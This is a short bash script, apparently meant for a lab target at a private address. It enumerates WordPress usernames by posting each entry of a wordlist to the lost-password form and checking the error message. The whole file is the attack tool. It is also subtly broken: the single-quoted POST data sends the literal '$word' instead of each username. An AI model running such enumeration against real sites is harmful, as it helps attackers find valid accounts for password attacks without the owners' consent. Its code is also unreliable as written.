#!/bin/bash

echo "Starting enumeration..."

while IFS= read -r word
do
	printf "Current word: $word\r";
	curl -X POST -d 'user_login=$word&redirect_to=&wp-submit=Get+New+Password' -s http://192.168.100.61/wp-login.php?action=lostpassword | if ! grep 'Invalid username or e-mail'; then echo "Match found: $word"; break; fi;
done < $1
